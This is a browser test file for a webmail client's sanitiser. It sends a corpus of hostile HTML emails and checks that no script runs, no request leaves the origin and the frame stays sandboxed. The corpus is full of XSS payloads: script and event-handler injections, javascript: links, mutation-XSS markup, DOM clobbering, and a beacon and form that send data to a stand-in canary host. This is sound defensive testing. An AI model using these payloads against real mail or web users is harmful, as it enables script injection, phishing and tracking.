// Copyright 2026 Cloudhal and the Podbay contributors
// Licensed under the Apache 2.0 license found in the LICENSE file.

/**
 * Tier 6: hostile mail in a real browser (rule S4). Every message here is written to do
 * something it must not: run a script, load something from another origin, open a window, post
 * a form, move the page, or talk to the app around it.
 *
 * For each one the test opens the message and then checks, from outside the page:
 *
 * - no script ran: nothing was posted to the app, no dialog opened, the page did not move;
 * - no request left the app's origin;
 * - nothing active is left in the frame's document;
 * - the frame never had to fall back on its content policy: the sanitiser is the first layer,
 *   and a violation there would mean something got past it. In the page, only the two reports
 *   that parsing itself causes are accepted (see `PARSE_TIME`).
 */
import type { Frame } from "@playwright/test";
import { expect, mime, test } from "./fixtures.ts";

/** A script that reports itself in every way a script could. */
const BEACON =
	'parent.postMessage({pwned:true},"*");top.postMessage({pwned:true},"*");new Image().src="https://canary.test/ran.png";fetch("https://canary.test/fetch");alert("pwned");top.location="https://canary.test/moved";document.title="pwned"';

const CORPUS: { name: string; html: string }[] = [
	{ name: "a script element", html: `<p>hello</p><script>${BEACON}</script>` },
	{
		name: "a script from another origin",
		html: '<script src="https://canary.test/x.js"></script><p>hi</p>',
	},
	{ name: "an image with an error handler", html: `<img src="x" onerror='${BEACON}'>` },
	{
		name: "handlers on elements that fire by themselves",
		html: `<body onload='${BEACON}'><details open ontoggle='${BEACON}'><summary>x</summary></details><input autofocus onfocus='${BEACON}'><marquee onstart='${BEACON}'>x</marquee><video autoplay onplay='${BEACON}' src="https://canary.test/v.mp4"></video>`,
	},
	{
		name: "an inline SVG with script",
		html: `<svg xmlns="http://www.w3.org/2000/svg" onload='${BEACON}'><script>${BEACON}</script><image href="https://canary.test/s.png"/><a href="javascript:${BEACON}"><text y="20">click</text></a></svg>`,
	},
	{
		name: "links with a script address",
		html: `<a id="l1" href="javascript:${BEACON}">one</a> <a id="l2" href="JaVaScRiPt:alert(1)">two</a> <a id="l3" href="data:text/html,<script>alert(1)</script>">three</a> <a id="l4" href="vbscript:msgbox(1)">four</a>`,
	},
	{
		name: "frames",
		html: `<iframe src="https://canary.test/frame"></iframe><iframe srcdoc="<script>${BEACON}</script>"></iframe><frameset><frame src="https://canary.test/f"></frameset><object data="https://canary.test/o"></object><embed src="https://canary.test/e">`,
	},
	{
		name: "a form that posts elsewhere",
		html: `<form id="f" action="https://canary.test/collect" method="post"><input name="password" value="x"><button formaction="https://canary.test/other">Sign in</button></form><script>document.getElementById("f").submit()</script>`,
	},
	{
		name: "a page that redirects or rebases itself",
		html: '<meta http-equiv="refresh" content="0;url=https://canary.test/refresh"><base href="https://canary.test/"><a href="/relative">relative</a><img src="pixel.png">',
	},
	{
		name: "a policy of its own",
		html: `<meta http-equiv="Content-Security-Policy" content="default-src *; script-src * 'unsafe-inline'"><script>${BEACON}</script>`,
	},
	{
		name: "styles that load from another origin",
		html: '<link rel="stylesheet" href="https://canary.test/a.css"><style>@import url("https://canary.test/b.css"); body{background:url(https://canary.test/c.png)}</style><p style="background-image:url(https://canary.test/d.png)">x</p><p style="background:url(\'//canary.test/e.png\')">y</p>',
	},
	{
		name: "remote images in every form",
		html: '<img src="https://canary.test/1.png"><img src="//canary.test/2.png"><img srcset="https://canary.test/3.png 2x"><picture><source srcset="https://canary.test/4.png"><img src="https://canary.test/5.png"></picture><video poster="https://canary.test/6.png"></video><table background="https://canary.test/7.png"><tr><td>x</td></tr></table><input type="image" src="https://canary.test/8.png"><audio src="https://canary.test/9.mp3" autoplay></audio>',
	},
	{
		name: "hints that make the browser connect",
		html: '<link rel="prefetch" href="https://canary.test/p"><link rel="dns-prefetch" href="//canary.test"><link rel="preconnect" href="https://canary.test"><a href="https://example.org/" ping="https://canary.test/ping">ping</a>',
	},
	{
		name: "markup that changes meaning when parsed twice",
		html: `<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror='${BEACON}'&gt;"></mglyph></table></mtext></math><noscript><p title="</noscript><img src=x onerror='${BEACON}'>"></p></noscript><svg><style><img src=x onerror='${BEACON}'></style></svg><textarea><script>${BEACON}</script></textarea><xmp><script>${BEACON}</script></xmp>`,
	},
	{
		name: "names that shadow the document",
		html: `<img name="body"><form id="parent"></form><a id="location" href="https://canary.test/clobber">x</a><img name="cookie"><img id="__watch"><script>${BEACON}</script>`,
	},
	{
		name: "a script that guesses how the app marks its own",
		html: `<script nonce="bm9uY2U=">${BEACON}</script><script type="module">${BEACON}</script><script>parent.postMessage({__emailIframeHeight:true,height:99999},"*")</script>`,
	},
];

/**
 * The sanitiser reads a message by letting the browser parse it into a document that is never
 * shown and never loads or runs anything. The browser still checks two things against the
 * page's policy while it parses, and reports them: an event handler attribute, and a `<base>`.
 * Both are reports about markup that the sanitiser then removes; nothing ran. Any other
 * violation in the page would mean something tried to load or run there.
 */
const PARSE_TIME = /^(?:script-src-attr inline|base-uri .*)$/;

/** What is left in the frame that could act. */
function audit(frame: Frame) {
	return frame.evaluate(() => {
		const all = [...document.querySelectorAll("*")];
		const address = (el: Element) => el.getAttribute("href") ?? el.getAttribute("xlink:href") ?? "";
		return {
			// The one script allowed is the app's own sizing script, and only in a frame that sizes itself.
			scripts: [...document.scripts].filter((s) => !s.textContent?.includes("__emailIframeHeight"))
				.length,
			handlers: all.filter((el) => [...el.attributes].some((a) => /^on/i.test(a.name))).length,
			active: document.querySelectorAll(
				"form, input, button, textarea, select, iframe, frame, frameset, object, embed, base, link, audio, video, meta[http-equiv=refresh]",
			).length,
			scriptLinks: all.filter((el) => /^\s*(javascript|vbscript|data):/i.test(address(el))).length,
			policies: [...document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]')].map(
				(m) => m.getAttribute("content") ?? "",
			),
			unsafeLinks: [...document.querySelectorAll("a[href]")].filter(
				(a) =>
					a.getAttribute("target") !== "_blank" || !/noopener/.test(a.getAttribute("rel") ?? ""),
			).length,
			pings: document.querySelectorAll("[ping]").length,
		};
	});
}

for (const [index, item] of CORPUS.entries()) {
	test(`a message with ${item.name} does nothing`, async ({ page, app }) => {
		const subject = `Hostile ${index + 1}: ${item.name}`;
		await app.deliver(mime({ subject, to: app.account.mailbox, html: item.html }));
		await app.signIn();
		const frame = await app.openMessage(subject);
		// Time for anything delayed: a timer, a redirect, an autoplay, a late load.
		await page.waitForTimeout(1200);

		expect(await app.contacted(), "hosts the browser tried to reach").toEqual([]);
		expect(app.watch.dialogs, "dialogs").toEqual([]);
		expect(app.watch.popups.length, "windows opened").toBe(0);
		expect(new URL(page.url()).pathname, "the page did not move").toContain("/mailbox/");
		// The tab's title is the app's own: the mailbox, with a count while something is unread.
		const escaped = app.account.mailbox.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
		expect(await page.title(), "the title is the app's").toMatch(
			new RegExp(`^(\\(\\d+\\) )?${escaped} - Podbay$`),
		);

		const seen = await app.seen();
		expect(seen.messages, "messages posted to the app").toEqual([]);
		expect(
			seen.violations.filter((v) => !PARSE_TIME.test(v)),
			"the page's policy",
		).toEqual([]);
		expect(await app.frameViolations(frame), "the frame's policy was not needed").toEqual([]);

		const left = await audit(frame);
		expect(left.scripts, "scripts in the frame").toBe(0);
		expect(left.handlers, "event handlers in the frame").toBe(0);
		expect(left.active, "forms, frames and embedded objects in the frame").toBe(0);
		expect(left.scriptLinks, "links with a script address").toBe(0);
		expect(left.unsafeLinks, "links that would open inside the app").toBe(0);
		expect(left.pings).toBe(0);
		// The only policy in the frame is the app's own: nothing a message brings can widen it.
		expect(left.policies).toHaveLength(1);
		expect(left.policies[0]).toMatch(/^default-src 'none'; .*img-src data:;/);
	});
}

test("the frame cannot reach the app around it", async ({ app }) => {
	const subject = "Hostile: reaching out of the frame";
	await app.deliver(mime({ subject, to: app.account.mailbox, html: "<p>plain</p>" }));
	await app.signIn();
	const frame = await app.openMessage(subject);
	// Asked from inside the frame, with the test's own access to it: what could a script there do?
	const reach = await frame.evaluate(() => {
		const attempt = (action: () => unknown) => {
			try {
				action();
				return "allowed";
			} catch {
				return "refused";
			}
		};
		return {
			origin: window.origin,
			parentDocument: attempt(() => window.parent.document.body),
			parentStorage: attempt(() => window.parent.localStorage.length),
			cookies: attempt(() => document.cookie),
			storage: attempt(() => window.localStorage.length),
		};
	});
	expect(reach).toEqual({
		origin: "null",
		parentDocument: "refused",
		parentStorage: "refused",
		cookies: "refused",
		storage: "refused",
	});
});
